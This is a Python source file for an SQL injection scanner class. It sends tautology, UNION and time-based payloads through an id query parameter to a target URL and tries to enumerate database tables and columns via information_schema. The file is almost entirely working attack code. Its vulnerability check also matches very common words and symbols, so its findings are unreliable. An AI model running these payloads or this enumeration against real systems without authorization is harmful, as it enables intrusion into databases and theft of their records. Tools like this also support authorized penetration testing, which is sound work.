import requests
import os
import json


class SQLInjectionManager:
    
    def __init__(self):
        pass  # You'll later add things like logging or Neo4j
        

    def perform_sql_injection(self, target_url, port, timeout=5, headers=None, enum_level=0):
        print(f"[SQLInjection] Starting test on {target_url}:{port}")
        self.output_dir = "outputs_sql"
        self.output_file = os.path.join(self.output_dir, "sql_results.json")
        if headers is None:
            headers = {}

        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT NULL --",
            "' AND SLEEP(5)--",
            "1' OR 1=1#",
            "1' AND 1=2#"
        ]


        results = []

        for payload in payloads:
            full_url = f"{target_url}/?id={payload}"

            try:
                response = requests.get(full_url, headers=headers, timeout=timeout)
                result = {
                    "payload": payload,
                    "status_code": response.status_code,
                    "content_length": len(response.text),
                    "snippet": response.text[:150]
                }
                print(f"[SQLInjection] Payload '{payload}' gave status {response.status_code}")
                results.append(result)

                if self._is_vulnerable(response):
                    result["vulnerable"] = True
                else:
                    result["vulnerable"] = False

            except Exception as e:
                print(f"[SQLInjection] Error on payload '{payload}': {e}")
                results.append({
                    "payload": payload,
                    "error": str(e),
                    "vulnerable": False
                })

        output = {
            "target": target_url,
            "port": port,
            "timeout": timeout,
            "headers": headers,
            "results": results,
            "vulnerable": any(r.get("vulnerable") for r in results)
        }

        if output["vulnerable"] and enum_level > 0:
            output["tables"] = self._enumerate_db(target_url, port, timeout, headers, enum_level)
            
        # Ensure output directory exists
        os.makedirs(self.output_dir, exist_ok=True)

        # Load existing JSON results if file exists
        if os.path.exists(self.output_file):
            try:
                with open(self.output_file, "r") as f:
                    existing_data = json.load(f)
                    if not isinstance(existing_data, list):
                        existing_data = [existing_data]
            except json.JSONDecodeError:
                existing_data = []
        else:
            existing_data = []

        # Append new output
        existing_data.append(output)

        # Write back to file
        try:
            with open(self.output_file, "w") as f:
                json.dump(existing_data, f, indent=4)
            print(f"[SQLInjection] Results saved to {self.output_file}")
        except Exception as e:
            print(f"[SQLInjection] Failed to save results: {e}")

        return output

    def _is_vulnerable(self, response):
        if response is None:
            return False
        
        indicators = [
            # Login / access granted
            "you are in",
            "login successful",
            "welcome",
            "you have logged in",
            "you are logged in",
            "admin panel",
            "hello admin",
            "user authenticated",
            "access granted",

            # SQL errors or warnings (common DBMS)
            "sql syntax error",
            "unexpected token",
            "mysql_fetch",
            "mysql_num_rows()",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "odbc", 
            "sqlstate",
            "native error",
            "syntax error",
            "unknown column",
            "query failed",
            "fatal error",
            "oracle error",
            "incorrect syntax near",
            "unterminated string constant",
            "invalid sql statement",
            "division by zero",
            "runtime error",
            "data type mismatch",

            # Indicators of returned DB data
            "select * from",
            "select", "from", "where",
            "table", "column",
            "row", "record",
            "id=", "user_id", "username", "password",
            "email", "credit card", "ssn",

            # Common field names
            "first name", "last name", "surname",
            "dob", "gender", "phone number",

            # Injection-specific output
            "' or '1'='1",
            "' or 1=1 --",
            "1' or 1=1 --",
            "' union select",
            "union select",
            "--",
            "#",
            "/*",
            
            # Known dummy users
            "gordon", "smith", "admin", "james", "brown",

            # Backend traces
            "error in your sql syntax",
            "server error",
            "internal server error",
            "application error"
        ]
        return any(indicator.lower() in response.text.lower() for indicator in indicators)
    
    
    def _enumerate_db(self, target_url, port, timeout, headers, enum_level):
        print("[SQLInjection] Attempting table enumeration...")

        enum_payloads = [
            "' UNION SELECT table_name FROM information_schema.tables --",
            "' UNION SELECT column_name FROM information_schema.columns --"
        ]

        found_tables = []

        for payload in enum_payloads:
            full_url = f"{target_url}/?id={payload}"

            try:
                response = requests.get(full_url, headers=headers, timeout=timeout)
                if response.status_code == 200:
                    snippet = response.text[:200].lower()
                    if "users" in snippet or "admin" in snippet:
                        found_tables.append("users/admin (guessed)")
                    elif "products" in snippet:
                        found_tables.append("products (guessed)")
                    else:
                        found_tables.append("unknown_table")
            except Exception as e:
                print(f"[SQLInjection] Enum payload error: {e}")
                continue

        return found_tables
